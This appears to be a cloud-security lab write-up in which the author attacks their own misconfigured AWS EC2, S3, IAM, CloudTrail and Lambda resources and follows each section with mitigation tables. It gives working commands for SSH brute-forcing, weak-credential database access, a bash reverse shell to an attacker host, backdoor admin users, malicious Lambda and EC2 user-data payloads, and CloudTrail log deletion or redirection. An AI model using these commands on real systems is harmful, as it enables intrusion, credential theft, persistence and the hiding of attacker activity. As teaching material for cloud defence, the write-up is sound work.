## 1.1 Exploiting the EC2 Instance

The `my-test-server` EC2 instance was targeted due to its misconfigured security group allowing broad access.

1.  **Reconnaissance (Nmap Scan):**
    A comprehensive port scan revealed open services:
    ```bash
    nmap -sS -sV -Pn 54.253.171.196 # Replace with your EC2 public IP
    ```
![Screenshot From 2025-06-20 01-08-44](https://github.com/user-attachments/assets/e7d2b1bf-6a28-46fe-8b8c-8f1de1337df2)


    * **Observation:** Ports **22 (SSH)**, **80 (HTTP)**, and **3306 (MySQL)** were found open.

2.  **SSH Brute-Force Attack (Hydra):**
    Attempted to obtain SSH login credentials using a wordlist attack:
    ```bash
    hydra -l ec2-user -P /usr/share/wordlists/rockyou.txt ssh://54.253.171.196 # Replace with your EC2 public IP
    ```

![Screenshot From 2025-06-19 02-58-40](https://github.com/user-attachments/assets/dd3f4d6b-ff13-4f6f-998b-0c8cddb582c7)

    * **Result:** SSH login via password is disable for this account.

3.  **Web Service Enumeration (Gobuster):**
    Enumerated web application directories to identify potential vulnerabilities:
    ```bash
    gobuster dir -u [http://54.253.171.196](http://54.253.171.196) -w /usr/share/wordlists/dirb/common.txt # Replace with your EC2 public IP
    ```

![Screenshot From 2025-06-19 03-01-44](https://github.com/user-attachments/assets/add43578-835e-464f-b7b3-7c8787fbc6d4)

    * **Observation:** No robust authentication or input validation was found, indicating potential attack vectors like directory traversal or Local File Inclusion (LFI).

4.  **MySQL Database Exploitation:**
    Accessed the MySQL service using default or weak credentials:
    ```bash
    mysql -h 54.253.171.196 -u root -p # Replace with your EC2 public IP
    # Enter password: root@
    ```
    * **Credentials Used:** `Username: root`, `Password: root@`
    * **Result:** Successful login provided access to all databases. Sensitive data (usernames, credentials, system logs) were retrieved using SQL queries (e.g., `SHOW DATABASES; USE users; SELECT * FROM credentials;`).

![Screenshot From 2025-06-20 01-19-10](https://github.com/user-attachments/assets/89a4165b-86b4-4236-912f-7baf61668c6a)

![Screenshot From 2025-06-20 01-19-27](https://github.com/user-attachments/assets/01a1fd57-eaa6-4a1a-aaf9-bd59fc6b1236)


5.  **Privilege Escalation:**
    After gaining shell access via SSH, `sudo -l` was checked. The `linpeas.sh` script was executed for automated enumeration:
    ```bash
    wget [https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh](https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh)
    chmod +x linpeas.sh
    ./linpeas.sh
    ```
    * **Result:** `linpeas.sh` identified potential privilege escalation vectors, including `sudo` configured without a password for the `ec2-user`. This allowed gaining root access.

6.  **Post Exploitation and Reverse Shell:**
    A reverse shell was established to maintain persistent access:
    * **Victim (EC2):**
        ```bash
        bash -i >& /dev/tcp/<attacker-ip>/4444 0>&1
        ```
    * **Attacker (Kali):**
        ```bash
        nc -lvnp 4444
        ```

#### Summary of EC2 Exploitation:

| Phase          | Technique Used             | Result                                   | Risk Level |
| :------------- | :------------------------- | :--------------------------------------- | :--------- |
| **Reconnaissance** | Nmap full port scan        | Found SSH, HTTP, MySQL open              | High       |
| **Authentication** | Hydra brute-force (SSH)    | Remote shell access obtained             | Critical   |
| **Data Theft** | MySQL login with weak creds  | Retrieved sensitive records              | High       |
| **Privilege Escalation** | `sudo` without password; `linpeas.sh` | Root access obtained                     | Critical   |
| **Persistence** | Reverse shell over TCP     | Maintained remote control                | Critical   |

#### Recommended Mitigations for EC2:

| Vulnerability             | Recommended Fix                                                    |
| :------------------------ | :----------------------------------------------------------------- |
| Open SSH to `0.0.0.0/0`   | Restrict SSH access to known IPs/IP ranges using Security Group rules. |
| Weak SSH credentials      | Enforce strong password policies & mandatory SSH key authentication. |
| Public MySQL access       | Bind MySQL to a private IP only; use internal network.             |
| `sudo` without password   | Apply least privilege principle to user roles on the instance.     |
| No monitoring or alerts   | Enable CloudTrail and GuardDuty for visibility and threat detection. |

---

## 1.2 Exploiting the Misconfigured S3 Bucket (`vulnerable-bucket-demo`)

The `vulnerable-bucket-demo` S3 bucket was targeted due to its public read/write access.

1.  **Identify S3 Buckets:**
    Discovered the target S3 bucket using common naming conventions or tools.
    * **Tools:** `AWSBucketDump` (e.g., `python AWSBucketDump.py -D <wordlist> -l buckets.txt`) can be used for broad enumeration.

2.  **Check Bucket Permission:**
    Tested for public listability:
    ```bash
    aws s3 ls s3://vulnerable-bucket-demo --no-sign-request
    ```

![Screenshot From 2025-06-20 01-45-30](https://github.com/user-attachments/assets/0c45da92-24c6-4631-9726-cd7ebbc0a2b9)

    * **Result:** Command succeeded, indicating the bucket is publicly listable.



3.  **List Bucket Contents:**
    Listed all objects in the bucket:
    ```bash
    aws s3 ls s3://vulnerable-bucket-demo --recursive --no-sign-request
    ```
![Screenshot From 2025-06-20 01-45-03](https://github.com/user-attachments/assets/d14d09b6-4186-45b5-88ae-ba9c566b9c96)

![Screenshot From 2025-06-20 01-46-01](https://github.com/user-attachments/assets/f3660e2d-6592-4ee2-bcde-3894c073f5d7)


    * For specific files:
        ```bash
        aws s3 cp s3://vulnerable-bucket-demo/filename.txt . --no-sign-request
        ```

4.  **Download Sensitive Files:**
    Downloaded identified sensitive files:
    ```bash
    aws s3 cp s3://vulnerable-bucket-demo/secret-credentials.txt . --no-sign-request
    aws s3 cp s3://vulnerable-bucket-demo/Alexa-credential.txt . --no-sign-request
    ```


    * **Discovery:** Identified IAM credentials (`AWS_ACCESS_KEY_ID`, `AWS_SECRET_ACCESS_KEY`), environment variables, and configuration files.

5.  **Analyze Leaked Keys or Credentials:**
    Examined downloaded files (e.g., `.env`, `.json`, `credentials.csv`) for AWS keys.
    * **Example:** `cat secret-credentials.txt` revealing `AWS_ACCESS_KEY_ID=AKIA... AWS_SECRET_ACCESS_KEY=xxxxxxxxxxxxxxx`.
    * **Configuration:** Set them up in the attacker's environment:
        ```bash
        export AWS_ACCESS_KEY_ID=AKIAxxxxxxxx
        export AWS_SECRET_ACCESS_KEY=xxxxxxxxxxxxxxxx
        ```
    * **Test Access:**
        ```bash
        aws sts get-caller-identity
        ```
        * **Result:** Successful `sts get-caller-identity` confirmed valid IAM access.

6.  **Privilege Escalation Using Leaked Keys:**
    Checked the permissions of the user associated with the leaked keys:
    ```bash
    aws iam list-attached-user-policies --user-name <user>
    # Or use enumerate-iam tool:
    # pip install enumerate-iam
    # enumerate-iam --access-key AKIA... --secret-key ...
    ```
    * **Result:** Identified that the leaked credentials belonged to the `temp-user` (our over-privileged IAM user) with `AdministratorAccess`.

7.  **Write to the Bucket (if applicable):**
    Demonstrated write access by uploading a file:
    ```bash
    echo "Backdoored!" > backdoor.txt
    aws s3 cp backdoor.txt s3://vulnerable-bucket-demo/ --no-sign-request
    ```
    * **Result:** Successfully wrote `backdoor.txt` to the public bucket.

#### Summary of S3 Exploitation:

| Phase          | Action                           | Command/Tool                     | Result                        |
| :------------- | :------------------------------- | :------------------------------- | :---------------------------- |
| **Enumeration** | Identify open S3 bucket          | `aws s3 ls`                      | Publicly listable bucket found |
| **Access** | Download sensitive file          | `aws s3 cp`                      | Retrieved `.env` file         |
| **Credential** | Extract IAM credentials from config | `cat .env`                       | Found AWS keys                |
| **Escalation** | Validate and use keys            | `aws sts get-caller-identity`    | Got IAM user access           |
| **Exploitation** | Upload/overwrite file            | `aws s3 cp backdoor.txt`         | Wrote to bucket               |

#### Recommendations to Prevent S3 Exploitation:

| Misconfiguration              | Remediation                                                          |
| :---------------------------- | :------------------------------------------------------------------- |
| Public read/list access       | Block public access at both account and bucket levels.               |
| Leaked credentials in bucket  | Scan uploads; apply least privilege to IAM users; use Secrets Manager. |
| Static site overwrites allowed | Enable S3 object versioning or restrict `PutObject` action.          |
| No monitoring                 | Enable S3 Server Access Logs and CloudTrail for S3 bucket events.    |

---

## 1.3 Exploiting the Over-Privileged IAM User (`temp-user`)

The `temp-user` was targeted after its `AdministratorAccess` credentials were leaked from the S3 bucket.

1.  **Obtain IAM User Credentials:**
    Credentials for `temp-user` were obtained from:
    * Misconfigured S3 buckets (`secret-credentials.txt`).
    * *(Future/alternative methods explored: Public GitHub leaks, hardcoded in Lambda function source code, exposed EC2 metadata)*.

2.  **Configure AWS CLI with Leaked Credentials:**
    Set up the AWS CLI with the compromised credentials:
    ```bash
    # For temporary use
    export AWS_ACCESS_KEY_ID=AKIA...
    export AWS_SECRET_ACCESS_KEY=xxxxxxxxxxxx
    ```
    * **Test Access:**
        ```bash
        aws sts get-caller-identity
        ```
        * **Result:** Successful `sts get-caller-identity` confirmed full IAM access.

![Screenshot From 2025-06-20 01-54-09](https://github.com/user-attachments/assets/88074206-357d-4399-b3e3-13bf95ca48e3)

3.  **Enumerate IAM User Permissions:**
    Verified the user's permissions:
    ```bash
    aws iam list-attached-user-policies --user-name temp-user
    aws iam list-user-policies --user-name temp-user
    # Or use enumerate-iam tool:
    # pip install enumerate-iam
    # enumerate-iam --access-key AKIA... --secret-key ...
    ```
    * **Result:** Confirmed `temp-user` had `iam:*`, `ec2:*`, `s3:*`, `lambda:*`, `ssm:*`, indicating `AdministratorAccess`.

![Screenshot From 2025-06-20 01-56-54](https://github.com/user-attachments/assets/2e9ba248-4c08-47b8-a6f9-ca120bd1f833)


4.  **Common Privilege Escalation Techniques (Demonstrated/Discussed):**

    * **A) Create New Admin User:**
        (If `iam:CreateUser` and `iam:AttachUserPolicy` are allowed)
        ```bash
        aws iam create-user --user-name attacker-persist
        aws iam create-access-key --user-name attacker-persist
        aws iam attach-user-policy --user-name attacker-persist \
        --policy-arn arn:aws:iam::aws:policy/AdministratorAccess
        ```
        * **Result:** A new, fully privileged backdoor user was created.

    * **B) Update Role Trust Policy for Privilege Escalation:**
        (If `iam:PassRole` and `sts:AssumeRole` are allowed)
        * Find an existing role (e.g., `aws iam list-roles`).
        * Modify its trust policy (`new-trust-policy.json`) to allow the attacker to assume it.
        * Assume the role:
            ```bash
            aws sts assume-role \
            --role-arn arn:aws:iam::<account-id>:role/<role-name> \
            --role-session-name attacker-session
            ```

    * **C) Launch EC2 with Malicious User Data:**
        (If `ec2:RunInstances`, `iam:PassRole`, `ec2:AssociateIamInstanceProfile` are allowed)
        * Launch a new EC2 instance with `user-data` containing a reverse shell script (`reverse-shell.sh`) that connects back to the attacker machine.
            ```bash
            aws ec2 run-instances \
            --image-id ami-0abcdef1234567890 \ # Replace with a valid AMI
            --count 1 \
            --instance-type t2.micro \
            --iam-instance-profile Name=adminProfile \ # Existing profile with high privs
            --user-data file://reverse-shell.sh
            ```
            * **Victim (New EC2):** `bash -i >& /dev/tcp/<attacker-ip>/4444 0>&1`
            * **Attacker (Kali):** `nc -lvnp 4444`

    * **D) Modify Lambda Function:**
        (If `lambda:UpdateFunctionCode` is allowed)
        * Download existing code (`aws lambda get-function --function-name my-demo-function`).
        * Upload malicious code (e.g., reverse shell, keylogger) as a ZIP file:
            ```bash
            aws lambda update-function-code \
            --function-name my-demo-function \
            --zip-file fileb://malicious_code.zip
            ```

5.  **Establish Persistence:**
    Various methods were discussed and could be established:
    * Creating backdoor IAM users with admin rights.
    * Adding attacker IPs to security groups.
    * Setting up CloudWatch logs or Lambda triggers for callbacks.

6.  **Cover Tracks:**
    (If applicable, depending on permissions)
    * `aws iam delete-user --user-name attacker-persist`
    * `aws iam detach-user-policy --user-name currentuser --policy-arn arn:aws:iam::aws:policy/AdministratorAccess` (if you were re-attaching policies).

#### Summary of IAM Exploitation:

| Phase         | Action                                 | Command / Tool                     |
| :------------ | :------------------------------------- | :--------------------------------- |
| **Recon** | List IAM policies                      | `aws iam list-user-policies`       |
| **Escalation A** | Create user + attach admin policy      | `aws iam create-user`, `attach-user-policy` |
| **Escalation B** | Assume privileged role                 | `aws sts assume-role`              |
| **Escalation C** | Launch EC2 with backdoor               | `aws ec2 run-instances`            |
| **Escalation D** | Upload malicious Lambda                | `aws lambda update-function-code`  |

---

## 1.4 Exploiting the CloudTrail Misconfiguration

The `OffensiveLabTrail` was targeted due to its disabled log file integrity validation and logging to a compromisable S3 bucket.

1.  **Understand CloudTrail Role in Security:**
    CloudTrail records API activity for auditing and forensics. Misconfigurations create blind spots.

2.  **Check for CloudTrail Configuration:**
    * **List Existing Trails:**
        ```bash
        aws cloudtrail describe-trails
        ```
    * **Check Logging Status:**
        ```bash
        aws cloudtrail get-trail-status --name my-personal-trial # Replace with your trail name
        ```
        * **Observation:** If logging is disabled, detection is off, allowing undetected actions.

3.  **Enumerate S3 Bucket for CloudTrail Logs:**
    CloudTrail logs are stored in an S3 bucket.
    ```bash
    aws s3 ls s3://my-bucket-for-trail --recursive --no-sign-request # Replace with your bucket name
    ```
    * **Result:** If accessible, could read logs (to see user actions) or identify sensitive actions/secrets.

4.  **Delete or Stop CloudTrail Logging (If Permissions Allow):**
    Using the `OverPrivilegedAdmin` user's credentials (or other compromised admin credentials):
    * **Stop Logging:**
        ```bash
        aws cloudtrail stop-logging --name my-personal-trial
        ```
    * **Delete the Trail:**
        ```bash
        aws cloudtrail delete-trail --name my-personal-trial
        ```
        * **Result:** Effectively disables detection and response for the AWS account.

5.  **Modify S3 Bucket Permissions (Log Tampering):**
    If CloudTrail logs go to an S3 bucket and the attacker has write/delete permissions on it:
    * **Delete Log Files:**
        ```bash
        aws s3 rm s3://<trail-bucket>/AWSLogs/<account-id>/CloudTrail/<region>/ --recursive
        ```
    * **Overwrite with Fake Logs:**
        ```bash
        echo "FAKE LOG ENTRY" > dummy.json
        aws s3 cp dummy.json s3://<trail-bucket>/AWSLogs/<account-id>/CloudTrail/<region>/2025/06/12/fake-log.json
        ```
        * **Result:** Erased or forged records to hide malicious activity.

6.  **Tamper with CloudTrail Settings:**
    If IAM permissions allow reconfiguring the logging (e.g., using `OverPrivilegedAdmin`):
    * **Change the S3 Bucket Destination:**
        ```bash
        aws cloudtrail update-trail \
        --name <trail-name> \
        --s3-bucket-name attacker-bucket # Attacker-controlled bucket
        ```
        * **Result:** All logs redirected to an attacker-controlled bucket, blinding defenders.

7.  **Persistence and Evasion:**
    * Used stolen credentials or newly created users after logs were disabled.
    * Focused on avoiding triggering new logs until normal logging was restored (if ever).

#### Summary of CloudTrail Exploitation:

| Phase       | Action                   | Command / Tool               | Goal                              |
| :---------- | :----------------------- | :--------------------------- | :-------------------------------- |
| **Recon** | List Trails              | `describe-trails`            | Identify logging setup            |
| **Audit** | Check Status             | `get-trail-status`           | See if logging is active          |
| **Log Access** | Read user actions        | `aws s3 ls/cp`               | View Logs                         |
| **Disable Logs** | Stop Logging / Delete Trail | `stop-logging` / `delete-trail` | Hide attacker activity            |
| **Tamper Logs** | Delete / Overwrite Logs  | `aws s3 rm/cp`               | Erase or forge records            |
| **Redirection** | Change Log Destination   | `update-trail`               | Redirect logs to attacker control |

---

## 1.5 Exploiting the Lambda Function Misconfiguration

The `SecretDisclosureFunc` Lambda function was targeted due to hardcoded credentials within its code.

1.  **Enumerate Lambda Functions:**
    Listed all Lambda functions using AWS CLI (assuming `OverPrivilegedAdmin` access):
    ```bash
    aws lambda list-functions
    ```
    * **Result:** Identified functions like `MySensitiveLambda`, `GetUserDetails`, `SecretDisclosureFunc`.

2.  **Download Function Code:**
    Downloaded the code package for `SecretDisclosureFunc`:
    ```bash
    aws lambda get-function --function-name SecretDisclosureFunc
    # From the output, get Code.Location (pre-signed S3 URL)
    wget "<Code.Location URL>"
    unzip function.zip
    ```

3.  **Analyze the Source Code:**
    Examined the unzipped code (e.g., `main.py`, `.env` files) for hardcoded secrets:
    * **Discovery:** Found hardcoded `AWS_SECRET_ACCESS_KEY` and `AWS_ACCESS_KEY_ID` belonging to the `OverPrivilegedAdmin` user, as well as mock `DB_PASSWORD` and `SENDGRID_API_KEY`.
    * **Example:**
        ```python
        # Inside main.py or a config file
        DB_PASSWORD = "supersecret123"
        AWS_SECRET_ACCESS_KEY = "abcd1234fakekey"
        SENDGRID_API_KEY = "SG.XXXX"
        ```

4.  **Use Leaked Secrets for Further Exploitation:**

    * **A) AWS Keys Found?**
        Used the discovered AWS keys to configure CLI and test access:
        ```bash
        export AWS_ACCESS_KEY_ID=...
        export AWS_SECRET_ACCESS_KEY=...
        aws sts get-caller-identity
        ```
        * **Result:** Confirmed administrative access to the AWS account.

    * **B) Database Credentials?**
        Attempted to connect to the MySQL database discovered in EC2 exploitation using leaked database credentials:
        ```bash
        mysql -h 54.33.45.132 -u root -p'supersecret123' # Replace with MySQL IP and password
        ```

5.  **Abuse the Lambda Role (Privilege Escalation):**
    Identified the Lambda function's execution role from `get-function` response (e.g., `arn:aws:iam::123456789012:role/lambda_basic_execution`).
    * **Enumerated Role Privileges:**
        ```bash
        aws iam get-role --role-name lambda_basic_execution
        ```
    * **Result:** If permissions like `s3:*`, `ec2:*`, `ssm:*` existed, these could be abused to:
        * Download S3 data.
        * Start EC2 instances.
        * Pull secrets from SSM Parameter Store.

6.  **Invoke the Function Manually:**
    Attempted to invoke the function with crafted input to identify sensitive data leaks or errors:
    ```bash
    aws lambda invoke \
    --function-name SecretDisclosureFunc \
    --payload '{"username":"admin"}' \
    output.txt
    cat output.txt
    ```
    * **Result:** Could potentially reveal sensitive data in logs, error messages, or stack traces.

![Screenshot From 2025-06-20 02-00-29](https://github.com/user-attachments/assets/485acde8-4aba-477e-9fb9-854356c7e644)

![Screenshot From 2025-06-20 02-17-54](https://github.com/user-attachments/assets/86dc39ae-5231-40de-9426-b9719a5bc32c)

![Screenshot From 2025-06-20 02-22-17](https://github.com/user-attachments/assets/0f0e5a65-ac21-4ce0-a1c8-3fe17771417c)

7.  **Lateral Movement or Persistence:**
    * Used discovered secrets for cross-service pivoting (e.g., to S3, RDS).
    * (If `lambda:UpdateFunctionCode` was permitted) Modified environment variables to implant a reverse shell or update the function with malicious code for persistence.

![Screenshot From 2025-06-20 02-27-25](https://github.com/user-attachments/assets/a6f177a8-adfc-483f-9fcb-0a6ec9025862)

![Screenshot From 2025-06-20 02-31-45](https://github.com/user-attachments/assets/38a1bb50-239b-4f63-8dca-f0ded7b0c996)

#### Summary of Lambda Exploitation:

| Phase         | Action                                 | Command/Tool                          | Outcome                      |
| :------------ | :------------------------------------- | :------------------------------------ | :--------------------------- |
| **Discovery** | List functions                         | `aws lambda list-functions`           | Identify targets             |
| **Extraction** | Download code                          | `aws lambda get-function` + `wget`    | Extract secrets              |
| **Analysis** | Review files                           | Inspect ZIP / `.py` / `.env`          | Find credentials             |
| **Abuse** | Use found secrets                      | `mysql`, `aws`, API tools             | Access external/internal     |
| **Escalation** | Explore IAM role permissions           | `aws iam get-role`                    | Use for privilege escalation |
| **Pivot** | Invoke, Modify, or Deploy new functions | `aws lambda invoke`, `update-function-code` | Deeper access                |

---
